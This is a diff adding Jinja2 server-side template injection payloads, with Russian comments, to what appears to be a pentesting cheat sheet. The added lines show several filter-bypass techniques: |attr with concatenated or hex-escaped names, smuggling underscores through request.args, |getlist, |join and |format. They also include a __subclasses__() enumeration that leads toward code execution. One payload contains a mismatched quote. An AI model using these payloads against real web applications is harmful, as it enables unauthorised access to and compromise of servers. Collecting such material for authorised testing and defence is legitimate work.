@@ -204,6 +204,29 @@ ${7*7}
 <%= 7*7%>
 ${{7*7}}
 #{7*7}
+
+# Для обхода фильтра по .__ можно использовать |attr()
+{{ ''|attr('__class__’)}}
+# Можно использовать сложение строк или закодировать
+{{request|attr("__"+"class"+"__")}}
+{{''['\x5f\x5fclass\x5f\x5f']}}
+# Также можно обратиться к атрибутам по индексу
+request["__class__"]
+# Кроме того, можно использовать Statements для определения переменных в темплейте
+{% set string = "ssti" %}
+
+{% set class = "__class__" %}
+
+{{ string|attr(class)}}
+
+{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
+# Для обхода фильтра по __  можно использовать requests.args для передачи частей полезной нагрузки в параметрах запроса и |join для соединения элементов в одну строку
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
+# Для обхода фильтра по []  можно использовать |getlist(). Данный метод возвращает всех значения, связанные с определенным ключом в запросе
+{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
+
+# В случае, если встретился фильтр по |join, можно использовать |format для форматирования строк по переданным значениями
+{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
 # burp search
 Go to the "Burp" > "Search" tab.
